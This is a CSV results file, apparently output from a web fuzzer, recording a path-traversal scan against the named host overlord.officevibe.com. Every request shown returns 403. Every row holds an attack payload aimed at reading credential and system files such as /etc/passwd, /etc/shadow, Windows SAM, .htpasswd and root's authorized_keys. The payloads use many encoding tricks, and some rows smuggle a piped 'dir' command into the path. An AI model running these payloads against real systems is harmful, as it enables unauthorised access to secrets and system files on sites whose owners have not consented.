FUZZ,url,redirectlocation,position,status_code,content_length,content_words,content_lines,content_type,duration,resultfile
..//..///etc/passwd,https://overlord.officevibe.com/..//..///etc/passwd,,89982,403,312,17,7,text/html; charset=us-ascii,28.560109ms,
..\..\..\..\..\..\temp\temp.class,https://overlord.officevibe.com/..\..\..\..\..\..\temp\temp.class,,91616,403,312,17,7,text/html; charset=us-ascii,27.578691ms,
../manager/text,https://overlord.officevibe.com/../manager/text,,91797,403,312,17,7,text/html; charset=us-ascii,28.254179ms,
..%5c..%5cetc/passwd,https://overlord.officevibe.com/..%5c..%5cetc/passwd,,93430,403,312,17,7,text/html; charset=us-ascii,28.343853ms,
../../../../apache/logs/error.log,https://overlord.officevibe.com/../../../../apache/logs/error.log,,93634,403,312,17,7,text/html; charset=us-ascii,43.606034ms,
..////etc/passwd,https://overlord.officevibe.com/..////etc/passwd,,94975,403,312,17,7,text/html; charset=us-ascii,29.27075ms,
../../../../../../../../../../WINNT/system32/ipconfig.exe,https://overlord.officevibe.com/../../../../../../../../../../WINNT/system32/ipconfig.exe,,95676,403,312,17,7,text/html; charset=us-ascii,27.505944ms,
.//..///etc/passwd,https://overlord.officevibe.com/.//..///etc/passwd,,96809,403,312,17,7,text/html; charset=us-ascii,28.506594ms,
../../../.htaccess,https://overlord.officevibe.com/../../../.htaccess,,98837,403,312,17,7,text/html; charset=us-ascii,28.405091ms,
cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%69%6E%64%6F%77%73%2Fping.exe%20127.0.0.1,https://overlord.officevibe.com/cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%69%6E%64%6F%77%73%2Fping.exe%20127.0.0.1,,99167,403,312,17,7,text/html; charset=us-ascii,28.188801ms,
%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd,https://overlord.officevibe.com/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd,,99682,403,312,17,7,text/html; charset=us-ascii,28.1632ms,
../html,https://overlord.officevibe.com/../html,,100072,403,312,17,7,text/html; charset=us-ascii,28.270697ms,
../config.php,https://overlord.officevibe.com/../config.php,,102518,403,312,17,7,text/html; charset=us-ascii,28.799617ms,
jreport/sendfile/help/../../../../../../../../../../../../../../etc/passwd,https://overlord.officevibe.com/jreport/sendfile/help/../../../../../../../../../../../../../../etc/passwd,,104832,403,312,17,7,text/html; charset=us-ascii,27.992904ms,
res/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,https://overlord.officevibe.com/res/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,,107746,403,312,17,7,text/html; charset=us-ascii,28.183627ms,
../users.db.php,https://overlord.officevibe.com/../users.db.php,,108705,403,312,17,7,text/html; charset=us-ascii,30.134451ms,
../apache/logs/error.log,https://overlord.officevibe.com/../apache/logs/error.log,,108758,403,312,17,7,text/html; charset=us-ascii,28.006079ms,
my_keys&dst=../../../root/.ssh/authorized_keys,https://overlord.officevibe.com/my_keys&dst=../../../root/.ssh/authorized_keys,,109041,403,312,17,7,text/html; charset=us-ascii,28.349702ms,
signEzUI/playlist/edit/upload/../../../../../../../../../../etc/passwd,https://overlord.officevibe.com/signEzUI/playlist/edit/upload/../../../../../../../../../../etc/passwd,,111191,403,312,17,7,text/html; charset=us-ascii,28.162171ms,
ca/..\\..\\..\\..\\..\\..\\..\\..\\winnt/\\win.ini,https://overlord.officevibe.com/ca/..\\..\\..\\..\\..\\..\\..\\..\\winnt/\\win.ini,,112444,403,312,17,7,text/html; charset=us-ascii,28.112652ms,
votes/../../admin/multiuser/multiuser.php,https://overlord.officevibe.com/votes/../../admin/multiuser/multiuser.php,,112576,403,312,17,7,text/html; charset=us-ascii,32.835603ms,
ca/..\\..\\..\\..\\..\\..\\/\\etc/\\passwd,https://overlord.officevibe.com/ca/..\\..\\..\\..\\..\\..\\/\\etc/\\passwd,,114224,403,312,17,7,text/html; charset=us-ascii,29.434181ms,
../../proc,https://overlord.officevibe.com/../../proc,,125026,403,312,17,7,text/html; charset=us-ascii,32.662576ms,
[SecCheck]/..%2f../ext.ini,https://overlord.officevibe.com/[SecCheck]/..%2f../ext.ini,,127572,403,312,17,7,text/html; charset=us-ascii,28.450957ms,
admin/../../../file/to/view,https://overlord.officevibe.com/admin/../../../file/to/view,,128723,403,312,17,7,text/html; charset=us-ascii,28.346711ms,
../../../../etc/passwd,https://overlord.officevibe.com/../../../../etc/passwd,,130010,403,312,17,7,text/html; charset=us-ascii,29.099111ms,
"tst.bat|dir%20..\\..\\..\\..\\..\\..\\..\\..\\,","https://overlord.officevibe.com/tst.bat|dir%20..\\..\\..\\..\\..\\..\\..\\..\\,",,134096,403,312,17,7,text/html; charset=us-ascii,27.848539ms,
../../../../../etc/passwd,https://overlord.officevibe.com/../../../../../etc/passwd,,134649,403,312,17,7,text/html; charset=us-ascii,29.005565ms,
../../var/www/logs/access_log,https://overlord.officevibe.com/../../var/www/logs/access_log,,136450,403,312,17,7,text/html; charset=us-ascii,28.210431ms,
NUL/../../../../../../../../../WINNT/system32/ipconfig.exe,https://overlord.officevibe.com/NUL/../../../../../../../../../WINNT/system32/ipconfig.exe,,137428,403,312,17,7,text/html; charset=us-ascii,28.376968ms,
../../../../pswd,https://overlord.officevibe.com/../../../../pswd,,139151,403,312,17,7,text/html; charset=us-ascii,27.712497ms,
../../..//etc/passwd,https://overlord.officevibe.com/../../..//etc/passwd,,145383,403,312,17,7,text/html; charset=us-ascii,30.915937ms,
../../../../../../../../../../etc/passwd,https://overlord.officevibe.com/../../../../../../../../../../etc/passwd,,149904,403,312,17,7,text/html; charset=us-ascii,28.977926ms,
\..\..\..\..\..\..\..\..\..\etc\passwd,https://overlord.officevibe.com/\..\..\..\..\..\..\..\..\..\etc\passwd,,149962,403,312,17,7,text/html; charset=us-ascii,28.278707ms,
..%2F..%2F..%2F..%2F..%2F../winnt/repair/sam._,https://overlord.officevibe.com/..%2F..%2F..%2F..%2F..%2F../winnt/repair/sam._,,150077,403,312,17,7,text/html; charset=us-ascii,30.260328ms,
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini,https://overlord.officevibe.com/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini,,150783,403,312,17,7,text/html; charset=us-ascii,27.964383ms,
../logs/error.log,https://overlord.officevibe.com/../logs/error.log,,150787,403,312,17,7,text/html; charset=us-ascii,27.638129ms,
../_config.php,https://overlord.officevibe.com/../_config.php,,152532,403,312,17,7,text/html; charset=us-ascii,28.156468ms,
%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f../boot.ini,https://overlord.officevibe.com/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f../boot.ini,,152732,403,312,17,7,text/html; charset=us-ascii,28.066967ms,
../../../../winnt/repair/sam._,https://overlord.officevibe.com/../../../../winnt/repair/sam._,,152901,403,312,17,7,text/html; charset=us-ascii,28.381954ms,
//./../.../boot.ini,https://overlord.officevibe.com///./../.../boot.ini,,154859,403,312,17,7,text/html; charset=us-ascii,27.889854ms,
../.htaccess,https://overlord.officevibe.com/../.htaccess,,154866,403,312,17,7,text/html; charset=us-ascii,27.657979ms,
a\..\..\muster.db,https://overlord.officevibe.com/a\..\..\muster.db,,155201,403,312,17,7,text/html; charset=us-ascii,28.536908ms,
./../../../../../../../../../../etc/passwd,https://overlord.officevibe.com/./../../../../../../../../../../etc/passwd,,158810,403,312,17,7,text/html; charset=us-ascii,28.985929ms,
../etc/passwd,https://overlord.officevibe.com/../etc/passwd,,161332,403,312,17,7,text/html; charset=us-ascii,28.640833ms,
../../../apache/logs/access.log,https://overlord.officevibe.com/../../../apache/logs/access.log,,165596,403,312,17,7,text/html; charset=us-ascii,28.217111ms,
RASHTML5Gateway//..\\\..\\\..\\\..\\\..\\\windows\win.ini,https://overlord.officevibe.com/RASHTML5Gateway//..\\\..\\\..\\\..\\\..\\\windows\win.ini,,168885,403,312,17,7,text/html; charset=us-ascii,28.742752ms,
./../../../../../../../../../../etc/shadow,https://overlord.officevibe.com/./../../../../../../../../../../etc/shadow,,170300,403,312,17,7,text/html; charset=us-ascii,27.932305ms,
../config.dat,https://overlord.officevibe.com/../config.dat,,175059,403,312,17,7,text/html; charset=us-ascii,28.146255ms,
../apache/logs/access.log,https://overlord.officevibe.com/../apache/logs/access.log,,175197,403,312,17,7,text/html; charset=us-ascii,28.241057ms,
../www,https://overlord.officevibe.com/../www,,175254,403,312,17,7,text/html; charset=us-ascii,32.522726ms,
../config.asp,https://overlord.officevibe.com/../config.asp,,179031,403,312,17,7,text/html; charset=us-ascii,28.196549ms,
./.././..//etc/passwd,https://overlord.officevibe.com/./.././..//etc/passwd,,181131,403,312,17,7,text/html; charset=us-ascii,28.041037ms,
..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cboot.ini,https://overlord.officevibe.com/..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cboot.ini,,183471,403,312,17,7,text/html; charset=us-ascii,27.853572ms,
error/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini,https://overlord.officevibe.com/error/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini,,186200,403,312,17,7,text/html; charset=us-ascii,28.174833ms,
../.htpasswd,https://overlord.officevibe.com/../.htpasswd,,186603,403,312,17,7,text/html; charset=us-ascii,27.930283ms,
lib/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,https://overlord.officevibe.com/lib/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,,188596,403,312,17,7,text/html; charset=us-ascii,28.100256ms,
../..//etc/passwd,https://overlord.officevibe.com/../..//etc/passwd,,193029,403,312,17,7,text/html; charset=us-ascii,27.606491ms,
static/../../../../windows/win.ini,https://overlord.officevibe.com/static/../../../../windows/win.ini,,201012,403,312,17,7,text/html; charset=us-ascii,28.627846ms,
%2e%2e//google.com,https://overlord.officevibe.com/%2e%2e//google.com,,202957,403,312,17,7,text/html; charset=us-ascii,28.224734ms,
../../../..//etc/passwd;index.html,https://overlord.officevibe.com/../../../..//etc/passwd;index.html,,203432,403,312,17,7,text/html; charset=us-ascii,27.894833ms,
modx/assets/cache/docid_1/../../../../../../../etc/passwd\0.pageCache.php,https://overlord.officevibe.com/modx/assets/cache/docid_1/../../../../../../../etc/passwd\0.pageCache.php,,206747,403,312,17,7,text/html; charset=us-ascii,28.521759ms,
/./../.../boot.ini,https://overlord.officevibe.com//./../.../boot.ini,,208978,403,312,17,7,text/html; charset=us-ascii,28.266829ms,
../config.inc.php,https://overlord.officevibe.com/../config.inc.php,,211520,403,312,17,7,text/html; charset=us-ascii,28.364408ms,
../manager/html,https://overlord.officevibe.com/../manager/html,,213723,403,312,17,7,text/html; charset=us-ascii,27.612072ms,
../../../../apache/logs/access.log,https://overlord.officevibe.com/../../../../apache/logs/access.log,,214776,403,312,17,7,text/html; charset=us-ascii,31.450373ms,
../admim,https://overlord.officevibe.com/../admim,,217845,403,312,17,7,text/html; charset=us-ascii,27.807428ms,
..%2F..%2F..%2F..%2F..%2F../windows/repair/sam,https://overlord.officevibe.com/..%2F..%2F..%2F..%2F..%2F../windows/repair/sam,,218082,403,312,17,7,text/html; charset=us-ascii,27.958081ms,
../../../../logs/access.log,https://overlord.officevibe.com/../../../../logs/access.log,,222807,403,312,17,7,text/html; charset=us-ascii,27.483614ms,
js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,https://overlord.officevibe.com/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,,224364,403,312,17,7,text/html; charset=us-ascii,29.222629ms,
"alibaba.pl|dir%20..\\..\\..\\..\\..\\..\\..\\,","https://overlord.officevibe.com/alibaba.pl|dir%20..\\..\\..\\..\\..\\..\\..\\,",,226017,403,312,17,7,text/html; charset=us-ascii,38.536538ms,
../../etc/passwd,https://overlord.officevibe.com/../../etc/passwd,,226249,403,312,17,7,text/html; charset=us-ascii,27.761127ms,
static/..%5c..%5c..%5c..%5cetc/passwd,https://overlord.officevibe.com/static/..%5c..%5c..%5c..%5cetc/passwd,,226291,403,312,17,7,text/html; charset=us-ascii,29.648212ms,
//////../../../../../../etc/passwd,https://overlord.officevibe.com///////../../../../../../etc/passwd,,226989,403,312,17,7,text/html; charset=us-ascii,27.849732ms,
"cgi-bin/tst.bat|dir%20..\\..\\..\\..\\..\\..\\..\\..\\,","https://overlord.officevibe.com/cgi-bin/tst.bat|dir%20..\\..\\..\\..\\..\\..\\..\\..\\,",,228125,403,312,17,7,text/html; charset=us-ascii,28.748224ms,
../../data/config/microsrv.cfg,https://overlord.officevibe.com/../../data/config/microsrv.cfg,,228343,403,312,17,7,text/html; charset=us-ascii,28.167213ms,
../../..//etc/passwd;index.html,https://overlord.officevibe.com/../../..//etc/passwd;index.html,,233973,403,312,17,7,text/html; charset=us-ascii,27.685805ms,
../..//etc/passwd;index.html,https://overlord.officevibe.com/../..//etc/passwd;index.html,,239233,403,312,17,7,text/html; charset=us-ascii,28.302344ms,
%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini,https://overlord.officevibe.com/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini,,241360,403,312,17,7,text/html; charset=us-ascii,28.206968ms,
..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,https://overlord.officevibe.com/..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,,243557,403,312,17,7,text/html; charset=us-ascii,27.744284ms,
../../../../../../../../../boot.ini,https://overlord.officevibe.com/../../../../../../../../../boot.ini,,245648,403,312,17,7,text/html; charset=us-ascii,28.35869ms,
../console,https://overlord.officevibe.com/../console,,250034,403,312,17,7,text/html; charset=us-ascii,31.935148ms,
../../windows/win.ini,https://overlord.officevibe.com/../../windows/win.ini,,253997,403,312,17,7,text/html; charset=us-ascii,28.268804ms,
../../../administrator/inbox,https://overlord.officevibe.com/../../../administrator/inbox,,255033,403,312,17,7,text/html; charset=us-ascii,27.948507ms,
static/..%5c..%5c..%5c..%5c..%5cetc/passwd,https://overlord.officevibe.com/static/..%5c..%5c..%5c..%5c..%5cetc/passwd,,255283,403,312,17,7,text/html; charset=us-ascii,28.042367ms,
dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole,https://overlord.officevibe.com/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole,,258795,403,312,17,7,text/html; charset=us-ascii,28.219441ms,
../../../../logs/error.log,https://overlord.officevibe.com/../../../../logs/error.log,,259632,403,312,17,7,text/html; charset=us-ascii,28.766828ms,
../../.htaccess,https://overlord.officevibe.com/../../.htaccess,,263185,403,312,17,7,text/html; charset=us-ascii,28.825401ms,
..%5c..%5c..%5cetc/passwd,https://overlord.officevibe.com/..%5c..%5c..%5cetc/passwd,,263409,403,312,17,7,text/html; charset=us-ascii,27.520899ms,
../../../apache/logs/error.log,https://overlord.officevibe.com/../../../apache/logs/error.log,,265724,403,312,17,7,text/html; charset=us-ascii,28.308715ms,
../../../..//etc/passwd,https://overlord.officevibe.com/../../../..//etc/passwd,,266700,403,312,17,7,text/html; charset=us-ascii,28.790361ms,
../logs/access.log,https://overlord.officevibe.com/../logs/access.log,,270935,403,312,17,7,text/html; charset=us-ascii,28.109078ms,
DomainFiles/*//../../../../../../../../../../etc/passwd,https://overlord.officevibe.com/DomainFiles/*//../../../../../../../../../../etc/passwd,,273573,403,312,17,7,text/html; charset=us-ascii,32.481303ms,
../agc/bp.pl,https://overlord.officevibe.com/../agc/bp.pl,,276301,403,312,17,7,text/html; charset=us-ascii,27.953633ms,
../install.php,https://overlord.officevibe.com/../install.php,,279316,403,312,17,7,text/html; charset=us-ascii,28.561023ms,
./..//etc/passwd,https://overlord.officevibe.com/./..//etc/passwd,,281572,403,312,17,7,text/html; charset=us-ascii,27.772825ms,
.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/var/www/html/index.html,https://overlord.officevibe.com/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/var/www/html/index.html,,282407,403,312,17,7,text/html; charset=us-ascii,27.748768ms,
